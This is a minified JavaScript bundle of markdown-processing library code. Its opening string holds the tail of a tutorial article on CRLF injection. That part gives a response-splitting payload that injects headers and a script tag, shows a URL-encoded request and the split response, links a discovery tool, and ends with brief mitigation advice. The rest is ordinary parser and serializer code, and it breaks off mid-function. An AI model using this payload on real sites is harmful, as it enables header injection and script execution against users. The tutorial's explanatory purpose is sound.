\`\`\`

Here’s a payload we can use to exploit this:

\`\`\`
en-US;<CRLF>Content-Type: text/html<CRLF>Content-Length:25<CRLF><CRLF><script>alert(1)<\/script>
\`\`\`

This is what it would look like in action:

\`\`\`
GET /language?lang=en-US%3B%3C%0d%0a%3EContent-Type%3A%20text%2Fhtml%3C%0d%0a%3EContent-Length%3A25%3C%0d%0a%0d%0a%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: site.com
Accept: text/html
↓
HTTP/1.1 301 Moved Permanently
Location: /
Set-Cookie: lang=en-US;
Content-Type: text/html
Content-Length:25
<script>alert(1)<\/script>;
\`\`\`

Automation
----------

The only tool I found for automating CRLF injection discovery: [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)

Mitigation
----------

To mitigate CRLF injection, strip all CRLF characters from user input and take user input as little as possible in general.

Ty for reading!
---------------`;function Ce(e,t){let n=String(e);if(typeof t!=`string`)throw TypeError(`Expected character`);let r=0,i=n.indexOf(t);for(;i!==-1;)r++,i=n.indexOf(t,i+t.length);return r}var we=Ne(/[A-Za-z]/),Te=Ne(/[\dA-Za-z]/),Ee=Ne(/[#-'*+\--9=?A-Z^-~]/);function De(e){return e!==null&&(e<32||e===127)}var Oe=Ne(/\d/),ke=Ne(/[\dA-Fa-f]/),Ae=Ne(/[!-/:-@[-`{-~]/);function A(e){return e!==null&&e<-2}function j(e){return e!==null&&(e<0||e===32)}function M(e){return e===-2||e===-1||e===32}var je=Ne(/\p{P}|\p{S}/u),Me=Ne(/\s/);function Ne(e){return t;function t(t){return t!==null&&t>-1&&e.test(String.fromCharCode(t))}}function Pe(e){if(typeof e!=`string`)throw TypeError(`Expected a string`);return e.replace(/[|\\{}()[\]^$+*?.]/g,`\\$&`).replace(/-/g,`\\x2d`)}var Fe=(function(e){if(e==null)return Be;if(typeof e==`function`)return ze(e);if(typeof e==`object`)return Array.isArray(e)?Ie(e):Le(e);if(typeof e==`string`)return Re(e);throw Error(`Expected function, string, or object as test`)});function Ie(e){let t=[],n=-1;for(;++n<e.length;)t[n]=Fe(e[n]);return ze(r);function r(...e){let n=-1;for(;++n<t.length;)if(t[n].apply(this,e))return!0;return!1}}function Le(e){let t=e;return ze(n);function n(n){let r=n,i;for(i in e)if(r[i]!==t[i])return!1;return!0}}function Re(e){return ze(t);function t(t){return t&&t.type===e}}function ze(e){return t;function t(t,n,r){return!!(Ve(t)&&e.call(this,t,typeof n==`number`?n:void 0,r||void 0))}}function Be(){return!0}function Ve(e){return typeof e==`object`&&!!e&&`type`in e}function He(e){return e}var Ue=[];function We(e,t,n,r){let i;typeof t==`function`&&typeof n!=`function`?(r=n,n=t):i=t;let a=Fe(i),o=r?-1:1;s(e,void 0,[])();function s(e,i,c){let l=e&&typeof e==`object`?e:{};if(typeof l.type==`string`){let t=typeof l.tagName==`string`?l.tagName:typeof l.name==`string`?l.name:void 0;Object.defineProperty(u,"name",{value:`node (`+He(e.type+(t?`<`+t+`>`:``))+`)`})}return u;function u(){let l=Ue,u,d,f;if((!t||a(e,i,c[c.length-1]||void 0))&&(l=Ge(n(e,c)),l[0]===!1))return l;if(`children`in e&&e.children){let t=e;if(t.children&&l[0]!==`skip`)for(d=(r?t.children.length:-1)+o,f=c.concat(t);d>-1&&d<t.children.length;){let e=t.children[d];if(u=s(e,d,f)(),u[0]===!1)return u;d=typeof u[1]==`number`?u[1]:d+o}}return l}}}function Ge(e){return Array.isArray(e)?e:typeof e==`number`?[!0,e]:e==null?Ue:[e]}function Ke(e,t,n){let r=Fe((n||{}).ignore||[]),i=qe(t),a=-1;for(;++a<i.length;)We(e,`text`,o);function o(e,t){let n=-1,i;for(;++n<t.length;){let e=t[n],a=i?i.children:void 0;if(r(e,a?a.indexOf(e):void 0,i))return;i=e}if(i)return s(e,t)}function s(e,t){let n=t[t.length-1],r=i[a][0],o=i[a][1],s=0,c=n.children.indexOf(e),l=!1,u=[];r.lastIndex=0;let d=r.exec(e.value);for(;d;){let n=d.index,i={index:d.index,input:d.input,stack:[...t,e]},a=o(...d,i);if(typeof a==`string`&&(a=a.length>0?{type:`text`,value:a}:void 0),a===!1)r.lastIndex=n+1;else{if(s!==n&&f({type:`text`,value:e.value.slice(s,n)}),Array.isArray(a))for(let e of a)f(e);else a&&f(a);s=n+d[0].length,l=!0}if(!r.global)break;d=r.exec(e.value)}return l?(s<e.value.length&&f({type:`text`,value:e.value.slice(s)}),n.children.splice(c,1,...u)):u=[e],c+u.length;function f(e){let t=u[u.length-1];t&&t.type===`text`&&e.type===`text`?t.value+=e.value:u.push(e)}}}function qe(e){if(!Array.isArray(e))throw TypeError(`Expected find and replace tuple or list of tuples`);let t=[],n=!e[0]||Array.isArray(e[0])?e:[e],r=-1;for(;++r<n.length;){let e=n[r];t.push([Je(e[0]),Ye(e[1])])}return t}function Je(e){return typeof e==`string`?new RegExp(Pe(e),`g`):e}function Ye(e){return typeof e==`function`?e:function(){return e}}var Xe=`phrasing`,Ze=[`autolink`,`link`,`image`,`label`];function Qe(){return{transforms:[ot],enter:{literalAutolink:et,literalAutolinkEmail:tt,literalAutolinkHttp:tt,literalAutolinkWww:tt},exit:{literalAutolink:at,literalAutolinkEmail:it,literalAutolinkHttp:nt,literalAutolinkWww:rt}}}function $e(){return{unsafe:[{character:`@`,before:`[+\\-.\\w]`,after:`[\\-.\\w]`,inConstruct:Xe,notInConstruct:Ze},{character:`.`,before:`[Ww]`,after:`[\\-.\\w]`,inConstruct:Xe,notInConstruct:Ze},{character:`:`,before:`[ps]`,after:`\\/`,inConstruct:Xe,notInConstruct:Ze}]}}function et(e){this.enter({type:`link`,title:null,url:``,children:[]},e)}function tt(e){this.config.enter.autolinkProtocol.call(this,e)}function nt(e){this.config.exit.autolinkProtocol.call(this,e)}function rt(e){this.config.exit.data.call(this,e);let t=this.stack[this.stack.length-1];t.type,t.url=`http://`+this.sliceSerialize(e)}function it(e){this.config.exit.autolinkEmail.call(this,e)}function at(e){this.exit(e)}function ot(e){Ke(e,[[/(https?:\/\/|www(?=\.))([-.\w]+)([^ \t\r\n]*)/gi,st],[/(?<=^|\s|\p{P}|\p{S})([-.\w+]+)@([-\w]+(?:\.[-\w]+)+)/gu,ct]],{ignore:[`link`,`linkReference`]})}function st(e,t,n,r,i){let a=``;if(!dt(i)||(/^w/i.test(t)&&(n=t+n,t=``,a=`http://`),!lt(n)))return!1;let o=ut(n+r);if(!o[0])return!1;let s={type:`link`,title:null,url:a+t+o[0],children:[{type:`text`,value:t+o[0]}]};return o[1]?[s,{type:`text`,value:o[1]}]:s}function ct(e,t,n,r){return!dt(r,!0)||/[-\d_]$/.test(n)?!1:{type:`link`,title:null,url:`mailto:`+t+`@`+n,children:[{type:`text`,value:t+`@`+n}]}}function lt(e){let t=e.split(`.`);return!(t.length<2||t[t.length-1]&&(/_/.test(t[t.length-1])||!/[a-zA-Z\d]/.test(t[t.length-1]))||t[t.length-2]&&(/_/.test(t[t.length-2])||!/[a-zA-Z\d]/.test(t[t.length-2])))}function ut(e){let t=/[!"&'),.:;<>?\]}]+$/.exec(e);if(!t)return[e,void 0];e=e.slice(0,t.index);let n=t[0],r=n.indexOf(`)`),i=Ce(e,`(`),a=Ce(e,`)`);for(;r!==-1&&i>a;)e+=n.slice(0,r+1),n=n.slice(r+1),r=n.indexOf(`)`),a++;return[e,n]}function dt(e,t){let n=e.input.charCodeAt(e.index-1);return(e.index===0||Me(n)||je(n))&&(!t||n!==47)}function N(e){return e.replace(/[\t\n\r ]+/g,` `).replace(/^ | $/g,``).toLowerCase().toUpperCase()}xt.peek=bt;function ft(){this.buffer()}function pt(e){this.enter({type:`footnoteReference`,identifier:``,label:``},e)}function mt(){this.buffer()}function ht(e){this.enter({type:`footnoteDefinition`,identifier:``,label:``,children:[]},e)}function gt(e){let t=this.resume(),n=this.stack[this.stack.length-1];n.type,n.identifier=N(this.sliceSerialize(e)).toLowerCase(),n.label=t}function _t(e){this.exit(e)}function vt(e){let t=this.resume(),n=this.stack[this.stack.length-1];n.type,n.identifier=N(this.sliceSerialize(e)).toLowerCase(),n.label=t}function yt(e){this.exit(e)}function bt(){return`[`}function xt(e,t,n,r){let i=n.createTracker(r),a=i.move(`[^`),o=n.enter(`footnoteReference`),s=n.enter(`reference`);return a+=i.move(n.safe(n.associationId(e),{after:`]`,before:a})),s(),o(),a+=i.move(`]`),a}function St(){return{enter:{gfmFootnoteCallString:ft,gfmFootnoteCall:pt,gfmFootnoteDefinitionLabelString:mt,gfmFootnoteDefinition:ht},exit:{gfmFootnoteCallString:gt,gfmFootnoteCall:_t,gfmFootnoteDefinitionLabelString:vt,gfmFootnoteDefinition:yt}}}function Ct(e){let t=!1;return e&&e.firstLineBlank&&(t=!0),{handlers:{footnoteDefinition:n,footnoteReference:xt},unsafe:[{character:`[`,inConstruct:[`label`,`phrasing`,`reference`]}]};function n(e,n,r,i){let a=r.createTracker(i),o=a.move(`[^`),s=r.enter(`footnoteDefinition`),c=r.enter(`label`);return o+=a.move(r.safe(r.associationId(e),{before:o,after:`]`})),c(),o+=a.move(`]:`),e.children&&e.children.length>0&&(a.shift(4),o+=a.move((t?`
`:` `)+r.indentLines(r.containerFlow(e,a.current()),t?Tt:wt))),s(),o}}function wt(e,t,n){return t===0?e:Tt(e,t,n)}function Tt(e,t,n){return(n?``:`    `)+e}var Et=[`autolink`,`destinationLiteral`,`destinationRaw`,`reference`,`titleQuote`,`titleApostrophe`];jt.attention=Mt,jt.peek=Nt;function Dt(){return{canContainEols:[`delete`],enter:{strikethrough:kt},exit:{strikethrough:At}}}function Ot(){return{handlers:{delete:jt},unsafe:[{character:`~`,inConstruct:`phrasing`,notInConstruct:Et}]}}function kt(e){this.enter({type:`delete`,children:[],position:void 0},e)}function At(e){this.exit(e)}function jt(e,t,n,r){let i=n.createTracker(r),a=n.stack.includes(`strikethrough`)?`~`:`~~`,o=n.enter(`strikethrough`),s=i.move(a);return s+=n.containerPhrasing(e,{...i.current(),before:s,after:`~`}),s+=i.move(a),o(),s}function Mt(){return{construct:`strikethrough`,markers:[`~`],sizes:[2,1]}}function Nt(){return`~`}function Pt(e){return e.length}function Ft(e,t){let n=t||{},r=(n.align||[]).concat(),i=n.stringLength||Pt,a=[],o=[],s=[],c=[],l=0,u=-1;for(;++u<e.length;){let t=[],r=[],a=-1;for(e[u].length>l&&(l=e[u].length);++a<e[u].length;){let o=It(e[u][a]);if(n.alignDelimiters!==!1){let e=i(o);r[a]=e,(c[a]===void 0||e>c[a])&&(c[a]=e)}t.push(o)}o[u]=t,s[u]=r}let d=-1;if(typeof r==`object`&&`length`in r)for(;++d<l;)a[d]=Lt(r[d]);else{let e=Lt(r);for(;++d<l;)a[d]=e}d=-1;let f=[],p=[];for(;++d<l;){let e=a[d],t=``,r=``;e===99?(t=`:`,r=`:`):e===108?t=`:`:e===114&&(r=`:`);let i=n.alignDelimiters===!1?1:Math.max(1,c[d]-t.length-r.length),o=t+`-`.repeat(i)+r;n.alignDelimiters!==!1&&(i=t.length+i+r.length,i>c[d]&&(c[d]=i),p[d]=i),f[d]=o}o.splice(1,0,f),s.splice(1,0,p),u=-1;let m=[];for(;++u<o.length;){let e=o[u],t=s[u];d=-1;let r=[];for(;++d<l;){let i=e[d]||``,o=``,s=``;if(n.alignDelimiters!==!1){let e=c[d]-(t[d]||0),n=a[d];n===114?o=` `.repeat(e):n===99?e%2?(o=` `.repeat(e/2+.5),s=` `.repeat(e/2-.5)):(o=` `.repeat(e/2),s=o):s=` `.repeat(e)}n.delimiterStart!==!1&&!d&&r.push(`|`),n.padding!==!1&&(n.alignDelimiters!==!1||i!==``)&&(n.delimiterStart!==!1||d)&&r.push(` `),n.alignDelimiters!==!1&&r.push(o),r.push(i),n.alignDelimiters!==!1&&r.push(s),n.padding!==!1&&r.push(` `),(n.delimiterEnd!==!1||d!==l-1)&&r.push(`|`)}m.push(n.delimiterEnd===!1?r.join(``).replace(/ +$/,``):r.join(``))}return m.join(`
`)}function It(e){return e==null?``:String(e)}function Lt(e){let t=typeof e==`string`?e.codePointAt(0):0;return t===67||t===99?99:t===76||t===108?108:t===82||t===114?114:0}function Rt(e,t,n,r){let i=n.enter(`blockquote`),a=n.createTracker(r);a.move(`> `),a.shift(2);let o=n.indentLines(n.containerFlow(e,a.current()),zt);return i(),o}function zt(e,t,n){return`>`+(n?``:` `)+e}function Bt(e,t){return Vt(e,t.inConstruct,!0)&&!Vt(e,t.notInConstruct,!1)}function Vt(e,t,n){if(typeof t==`string`&&(t=[t]),!t||t.length===0)return n;let r=-1;for(;++r<t.length;)if(e.includes(t[r]))return!0;return!1}function Ht(e,t,n,r){let i=-1;for(;++i<n.unsafe.length;)if(n.unsafe[i].character===`
`&&Bt(n.stack,n.unsafe[i]))return/[ \t]/.test(r.before)?``:` `;return`\\
`}function Ut(e,t){let n=String(e),r=n.indexOf(t),i=r,a=0,o=0;if(typeof t!=`string`)throw TypeError(`Expected substring`);for(;r!==-1;)r===i?++a>o&&(o=a):a=1,i=r+t.length,r=n.indexOf(t,i);return o}function Wt(e,t){return!!(t.options.fences===!1&&e.value&&!e.lang&&/[^ \r\n]/.test(e.value)&&!/^[\t ]*(?:[\r\n]|$)|(?:^|[\r\n])[\t ]*$/.test(e.value))}function Gt(e){let t=e.options.fence||"`";if(t!=="`"&&t!==`~`)throw Error("Cannot serialize code with `"+t+"` for `options.fence`, expected `` ` `` or `~`");return t}function Kt(e,t,n,r){let i=Gt(n),a=e.value||``,o=i==="`"?`GraveAccent`:`Tilde`;if(Wt(e,n)){let e=n.enter(`codeIndented`),t=n.indentLines(a,qt);return e(),t}let s=n.createTracker(r),c=i.repeat(Math.max(Ut(a,i)+1,3)),l=n.enter(`codeFenced`),u=s.move(c);if(e.lang){let t=n.enter(`codeFencedLang${o}`);u+=s.move(n.safe(e.lang,{before:u,after:` `,encode:["`"],...s.current()})),t()}if(e.lang&&e.meta){let t=n.enter(`codeFencedMeta${o}`);u+=s.move(` `),u+=s.move(n.safe(e.meta,{before:u,after:`
`,encode:["`"],...s.current()})),t()}return u+=s.move(`
`),a&&(u+=s.move(a+`
`)),u+=s.move(c),l(),u}function qt(e,t,n){return(n?``:`    `)+e}function Jt(e){let t=e.options.quote||`"`;if(t!==`"`&&t!==`'`)throw Error("Cannot serialize title with `"+t+"` for `options.quote`, expected `\"`, or `'`");return t}function Yt(e,t,n,r){let i=Jt(n),a=i===`"`?`Quote`:`Apostrophe`,o=n.enter(`definition`),s=n.enter(`label`),c=n.createTracker(r),l=c.move(`[`);return l+=c.move(n.safe(n.associationId(e),{before:l,after:`]`,...c.current()})),l+=c.move(`]: `),s(),!e.url||/[\0- \u007F]/.test(e.url)?(s=n.enter(`destinationLiteral`),l+=c.move(`<`),l+=c.move(n.safe(e.url,{before:l,after:`>`,...c.current()})),l+=c.move(`>`)):(s=n.enter(`destinationRaw`),l+=c.move(n.safe(e.url,{before:l,after:e.title?` `:`
`,...c.current()}))),s(),e.title&&(s=n.enter(`title${a}`),l+=c.move(` `+i),l+=c.move(n.safe(e.title,{before:l,after:i,...c.current()})),l+=c.move(i),s()),o(),l}function Xt(e){let t=e.options.emphasis||`*`;if(t!==`*`&&t!==`_`)throw Error("Cannot serialize emphasis with `"+t+"` for `options.emphasis`, expected `*`, or `_`");return t}function Zt(e){return`&#x`+e.toString(16).toUpperCase()+`;`}function Qt(e){if(e===null||j(e)||Me(e))return 1;if(je(e))return 2}function $t(e,t,n){let r=Qt(e),i=Qt(t);return r===void 0?i===void 0?n===`_`?{inside:!0,outside:!0}:{inside:!1,outside:!1}:i===1?{inside:!0,outside:!0}:{inside:!1,outside:!0}:r===1?i===void 0?{inside:!1,outside:!1}:i===1?{inside:!0,outside:!0}:{inside:!1,outside:!1}:i===void 0?{inside:!1,outside:!1}:i===1?{inside:!0,outside:!1}:{inside:!1,outside:!1}}en.peek=tn;function en(e,t,n,r){let i=Xt(n),a=n.enter(`emphasis`),o=n.createTracker(r),s=o.move(i),c=o.move(n.containerPhrasing(e,{after:i,before:s,...o.current()})),l=c.charCodeAt(0),u=$t(r.before.charCodeAt(r.before.length-1),l,i);u.inside&&(c=Zt(l)+c.slice(1));let d=c.charCodeAt(c.length-1),f=$t(r.after.charCodeAt(0),d,i);f.inside&&(c=c.slice(0,-1)+Zt(d));let p=o.move(i);return a(),n.attentionEncodeSurroundingInfo={after:f.outside,before:u.outside},s+c+p}function tn(e,t,n){return n.options.emphasis||`*`}function nn(e,t,n,r){let i,a,o;typeof t==`function`&&typeof n!=`function`?(a=void 0,o=t,i=n):(a=t,o=n,i=r),We(e,a,s,i);function s(e,t){let n=t[t.length-1],r=n?n.children.indexOf(e):void 0;return o(e,r,n)}}var rn={};function an(e,t){let n=t||rn;return on(e,typeof n.includeImageAlt!=`boolean`||n.includeImageAlt,typeof n.includeHtml!=`boolean`||n.includeHtml)}function on(e,t,n){if(cn(e)){if(`value`in e)return e.type===`html`&&!n?``:e.value;if(t&&`alt`in e&&e.alt)return e.alt;if(`children`in e)return sn(e.children,t,n)}return Array.isArray(e)?sn(e,t,n):``}function sn(e,t,n){let r=[],i=-1;for(;++i<e.length;)r[i]=on(e[i],t,n);return r.join(``)}function cn(e){return!!(e&&typeof e==`object`)}function ln(e,t){let n=!1;return nn(e,function(e){if(`value`in e&&/\r?\n|\r/.test(e.value)||e.type===`break`)return n=!0,!1}),!!((!e.depth||e.depth<3)&&an(e)&&(t.options.setext||n))}function un(e,t,n,r){let i=Math.max(Math.min(6,e.depth||1),1),a=n.createTracker(r);if(ln(e,n)){let t=n.enter(`headingSetext`),r=n.enter(`phrasing`),o=n.containerPhrasing(e,{...a.current(),before:`
`,after:`
`});return r(),t(),o+`
`+(i===1?`=`:`-`).repeat(o.length-(Math.max(o.lastIndexOf(`\r`),o.lastIndexOf(`
`))+1))}let o=`#`.repeat(i),s=n.enter(`headingAtx`),c=n.enter(`phrasing`);a.move(o+` `);let l=n.containerPhrasing(e,{before:`# `,after:`
`,...a.current()});return/^[\t ]/.test(l)&&(l=Zt(l.charCodeAt(0))+l.slice(1)),l=l?o+` `+l:o,n.options.closeAtx&&(l+=` `+o),c(),s(),l}dn.peek=fn;function dn(e){return e.value||``}function fn(){return`<`}pn.peek=mn;function pn(e,t,n,r){let i=Jt(n),a=i===`"`?`Quote`:`Apostrophe`,o=n.enter(`image`),s=n.enter(`label`),c=n.createTracker(r),l=c.move(`![`);return l+=c.move(n.safe(e.alt,{before:l,after:`]`,...c.current()})),l+=c.move(`](`),s(),!e.url&&e.title||/[\0- \u007F]/.test(e.url)?(s=n.enter(`destinationLiteral`),l+=c.move(`<`),l+=c.move(n.safe(e.url,{before:l,after:`>`,...c.current()})),l+=c.move(`>`)):(s=n.enter(`destinationRaw`),l+=c.move(n.safe(e.url,{before:l,after:e.title?` `:`)`,...c.current()}))),s(),e.title&&(s=n.enter(`title${a}`),l+=c.move(` `+i),l+=c.move(n.safe(e.title,{before:l,after:i,...c.current()})),l+=c.move(i),s()),l+=c.move(`)`),o(),l}function mn(){return`!`}hn.peek=gn;function hn(e,t,n,r){let i=e.referenceType,a=n.enter(`imageReference`),o=n.enter(`label`),s=n.createTracker(r),c=s.move(`![`),l=n.safe(e.alt,{before:c,after:`]`,...s.current()});c+=s.move(l+`][`),o();let u=n.stack;n.stack=[],o=n.enter(`reference`);let d=n.safe(n.associationId(e),{before:c,after:`]`,...s.current()});return o(),n.stack=u,a(),i===`full`||!l||l!==d?c+=s.move(d+`]`):i===`shortcut`?c=c.slice(0,-1):c+=s.move(`]`),c}function gn(){return`!`}_n.peek=vn;function _n(e,t,n){let r=e.value||``,i="`",a=-1;for(;RegExp("(^|[^`])"+i+"([^`]|$)").test(r);)i+="`";for(/[^ \r\n]/.test(r)&&(/^[ \r\n]/.test(r)&&/[ \r\n]$/.test(r)||/^`|`$/.test(r))&&(r=` `+r+` `);++a<n.unsafe.length;){let e=n.unsafe[a],t=n.compilePattern(e),i;if(e.atBreak)for(;i=t.exec(r);){let e=i.index;r.charCodeAt(e)===10&&r.charCodeAt(e-1)===13&&e--,r=r.slice(0,e)+` `+r.slice(i.index+1)}}return i+r+i}function vn(){return"`"}function yn(e,t){let n=an(e);return!!(!t.options.resourceLink&&e.url&&!e.title&&e.children&&e.children.length===1&&e.children[0].type===`text`&&(n===e.url||`mailto:`+n===e.url)&&/^[a-z][a-z+.-]+:/i.test(e.url)&&!/[\0- <>\u007F]/.test(e.url))}bn.peek=xn;function bn(e,t,n,r){let i=Jt(n),a=i===`"`?`Quote`:`Apostrophe`,o=n.createTracker(r),s,c;if(yn(e,n)){let t=n.stack;n.stack=[],s=n.enter(`autolink`);let r=o.move(`<`);return r+=o.move(n.containerPhrasing(e,{before:r,after:`>`,...o.current()})),r+=o.move(`>`),s(),n.stack=t,r}s=n.enter(`link`),c=n.enter(`label`);let l=o.move(`[`);return l+=o.move(n.containerPhrasing(e,{before:l,after:`](`,...o.current()})),l+=o.move(`](`),c(),!e.url&&e.title||/[\0- \u007F]/.test(e.url)?(c=n.enter(`destinationLiteral`),l+=o.move(`<`),l+=o.move(n.safe(e.url,{before:l,after:`>`,...o.current()})),l+=o.move(`>`)):(c=n.enter(`destinationRaw`),l+=o.move(n.safe(e.url,{before:l,after:e.title?` `:`)`,...o.current()}))),c(),e.title&&(c=n.enter(`title${a}`),l+=o.move(` `+i),l+=o.move(n.safe(e.title,{before:l,after:i,...o.current()})),l+=o.move(i),c()),l+=o.move(`)`),s(),l}function xn(e,t,n){return yn(e,n)?`<`:`[`}Sn.peek=Cn;function Sn(e,t,n,r){let i=e.referenceType,a=n.enter(`linkReference`),o=n.enter(`label`),s=n.createTracker(r),c=s.move(`[`),l=n.containerPhrasing(e,{before:c,after:`]`,...s.current()});c+=s.move(l+`][`),o();let u=n.stack;n.stack=[],o=n.enter(`reference`);let d=n.safe(n.associationId(e),{before:c,after:`]`,...s.current()});return o(),n.stack=u,a(),i===`full`||!l||l!==d?c+=s.move(d+`]`):i===`shortcut`?c=c.slice(0,-1):c+=s.move(`]`),c}function Cn(){return`[`}function wn(e){let t=e.options.bullet||`*`;if(t!==`*`&&t!==`+`&&t!==`-`)throw Error("Cannot serialize items with `"+t+"` for `options.bullet`, expected `*`, `+`, or `-`");return t}function Tn(e){let t=wn(e),n=e.options.bulletOther;if(!n)return t===`*`?`-`:`*`;if(n!==`*`&&n!==`+`&&n!==`-`)throw Error("Cannot serialize items with `"+n+"` for `options.bulletOther`, expected `*`, `+`, or `-`");if(n===t)throw Error("Expected `bullet` (`"+t+"`) and `bulletOther` (`"+n+"`) to be different");return n}function En(e){let t=e.options.bulletOrdered||`.`;if(t!==`.`&&t!==`)`)throw Error("Cannot serialize items with `"+t+"` for `options.bulletOrdered`, expected `.` or `)`");return t}function Dn(e){let t=e.options.rule||`*`;if(t!==`*`&&t!==`-`&&t!==`_`)throw Error("Cannot serialize rules with `"+t+"` for `options.rule`, expected `*`, `-`, or `_`");return t}function On(e,t,n,r){let i=n.enter(`list`),a=n.bulletCurrent,o=e.ordered?En(n):wn(n),s=e.ordered?o===`.`?`)`:`.`:Tn(n),c=t&&n.bulletLastUsed?o===n.bulletLastUsed:!1;if(!e.ordered){let t=e.children?e.children[0]:void 0;if((o===`*`||o===`-`)&&t&&(!t.children||!t.children[0])&&n.stack[n.stack.length-1]===`list`&&n.stack[n.stack.length-2]===`listItem`&&n.stack[n.stack.length-3]===`list`&&n.stack[n.stack.length-4]===`listItem`&&n.indexStack[n.indexStack.length-1]===0&&n.indexStack[n.indexStack.length-2]===0&&n.indexStack[n.indexStack.length-3]===0&&(c=!0),Dn(n)===o&&t){let t=-1;for(;++t<e.children.length;){let n=e.children[t];if(n&&n.type===`listItem`&&n.children&&n.children[0]&&n.children[0].type===`thematicBreak`){c=!0;break}}}}c&&(o=s),n.bulletCurrent=o;let l=n.containerFlow(e,r);return n.bulletLastUsed=o,n.bulletCurrent=a,i(),l}function kn(e){let t=e.options.listItemIndent||`one`;if(t!==`tab`&&t!==`one`&&t!==`mixed`)throw Error("Cannot serialize items with `"+t+"` for `options.listItemIndent`, expected `tab`, `one`, or `mixed`");return t}function An(e,t,n,r){let i=kn(n),a=n.bulletCurrent||wn(n);t&&t.type===`list`&&t.ordered&&(a=(typeof t.start==`number`&&t.start>-1?t.start:1)+(n.options.incrementListMarker===!1?0:t.children.indexOf(e))+a);let o=a.length+1;(i===`tab`||i===`mixed`&&(t&&t.type===`list`&&t.spread||e.spread))&&(o=Math.ceil(o/4)*4);let s=n.createTracker(r);s.move(a+` `.repeat(o-a.length)),s.shift(o);let c=n.enter(`listItem`),l=n.indentLines(n.containerFlow(e,s.current()),u);return c(),l;function u(e,t,n){return t?(n?``:` `.repeat(o))+e:(n?a:a+` `.repeat(o-a.length))+e}}function jn(e,t,n,r){let i=n.enter(`paragraph`),a=n.enter(`phrasing`),o=n.containerPhrasing(e,r);return a(),i(),o}var Mn=Fe([`break`,`delete`,`emphasis`,`footnote`,`footnoteReference`,`image`,`imageReference`,`inlineCode`,`inlineMath`,`link`,`linkReference`,`mdxJsxTextElement`,`mdxTextExpression`,`strong`,`text`,`textDirective`]);function Nn(e,t,n,r){return(e.children.some(function(e){return Mn(e)})?n.containerPhrasing:n.containerFlow).call(n,e,r)}function Pn(e){let t=e.options.strong||`*`;if(t!==`*`&&t!==`_`)throw Error("Cannot serialize strong with `"+t+"` for `options.strong`, expected `*`, or `_`");return t}Fn.peek=In;function Fn(e,t,n,r){let i=Pn(n),a=n.enter(`strong`),o=n.createTracker(r),s=o.move(i+i),c=o.move(n.containerPhrasing(e,{after:i,before:s,...o.current()})),l=c.charCodeAt(0),u=$t(r.before.charCodeAt(r.before.length-1),l,i);u.inside&&(c=Zt(l)+c.slice(1));let d=c.charCodeAt(c.length-1),f=$t(r.after.charCodeAt(0),d,i);f.inside&&(c=c.slice(0,-1)+Zt(d));let p=o.move(i+i);return a(),n.attentionEncodeSurroundingInfo={after:f.outside,before:u.outside},s+c+p}function In(e,t,n){return n.options.strong||`*`}function Ln(e,t,n,r){return n.safe(e.value,r)}function Rn(e){let t=e.options.ruleRepetition||3;if(t<3)throw Error("Cannot serialize rules with repetition `"+t+"` for `options.ruleRepetition`, expected `3` or more");return t}function zn(e,t,n){let r=(Dn(n)+(n.options.ruleSpaces?` `:``)).repeat(Rn(n));return n.options.ruleSpaces?r.slice(0,-1):r}var Bn={blockquote:Rt,break:Ht,code:Kt,definition:Yt,emphasis:en,hardBreak:Ht,heading:un,html:dn,image:pn,imageReference:hn,inlineCode:_n,link:bn,linkReference:Sn,list:On,listItem:An,paragraph:jn,root:Nn,strong:Fn,text:Ln,thematicBreak:zn},Vn=document.createElement(`i`);function Hn(e){let t=`&`+e+`;`;Vn.innerHTML=t;let n=Vn.textContent;return n.charCodeAt(n.length-1)===59&&e!==`semi`?!1:n!==t&&n}function Un(e,t){let n=Number.parseInt(e,t);return n<9||n===11||n>13&&n<32||n>126&&n<160||n>55295&&n<57344||n>64975&&n<65008||(n&65535)==65535||(n&65535)==65534||n>1114111?`�`:String.fromCodePoint(n)}var Wn=/\\([!-/:-@[-`{-~])|&(#(?:\d{1,7}|x[\da-f]{1,6})|[\da-z]{1,31});/gi;function Gn(e){return e.replace(Wn,Kn)}function Kn(e,t,n){if(t)return t;if(n.charCodeAt(0)===35){let e=n.charCodeAt(1),t=e===120||e===88;return Un(n.slice(t?2:1),t?16:10)}return Hn(n)||e}function qn(){return{enter:{table:Jn,tableData:Qn,tableHeader:Qn,tableRow:Xn},exit:{codeText:$n,table:Yn,tableData:Zn,tableHeader:Zn,tableRow:Zn}}}function Jn(e){let t=e._align;this.enter({type:`table`,align:t.map(function(e){return e===`none`?null:e}),children:[]},e),this.data.inTable=!0}function Yn(e){this.exit(e),this.data.inTable=void 0}function Xn(e){this.enter({type:`tableRow`,children:[]},e)}function Zn(e){this.exit(e)}function Qn(e){this.enter({type:`tableCell`,children:[]},e)}function $n(e){let t=this.resume();this.data.inTable&&(t=t.replace(/\\([\\|])/g,er));let n=this.stack[this.stack.length-1];n.type,n.value=t,this.exit(e)}function er(e,t){return t===`|`?t:e}function tr(e){let t=e||{},n=t.tableCellPadding,r=t.tablePipeAlign,i=t.stringLength,a=n?` `:`|`;return{unsafe:[{character:`\r`,inConstruct:`tableCell`},{character:`
`,inConstruct:`tableCell`},{atBreak:!0,character:`|`,after:`[	 :-]`},{character:`|`,inConstruct:`tableCell`},{atBreak:!0,character:`:`,after:`-`},{atBreak:!0,character:`-`,after:`[:|-]`}],handlers:{inlineCode:f,table:o,tableCell:c,tableRow:s}};function o(e,t,n,r){return l(u(e,n,r),e.align)}function s(e,t,n,r){let i=l([d(e,n,r)]);return i.slice(0,i.indexOf(`
`))}function c(e,t,n,r){let i=n.enter(`tableCell`),o=n.enter(`phrasing`),s=n.containerPhrasing(e,{...r,before:a,after:a});return o(),i(),s}function l(e,t){return Ft(e,{align:t,alignDelimiters:r,padding:n,stringLength:i})}function u(e,t,n){let r=e.children,i=-1,a=[],o=t.enter(`table`);for(;++i<r.length;)a[i]=d(r[i],t,n);return o(),a}function d(e,t,n){let r=e.children,i=-1,a=[],o=t.enter(`tableRow`);for(;++i<r.length;)a[i]=c(r[i],e,t,n);return o(),a}function f(e,t,n){let r=Bn.inlineCode(e,t,n);return n.stack.includes(`tableCell`)&&(r=r.replace(/\|/g,`\\$&`)),r}}function nr(){return{exit:{taskListCheckValueChecked:ir,taskListCheckValueUnchecked:ir,paragraph:ar}}}function rr(){return{unsafe:[{atBreak:!0,character:`-`,after:`[:|-]`}],handlers:{listItem:or}}}function ir(e){let 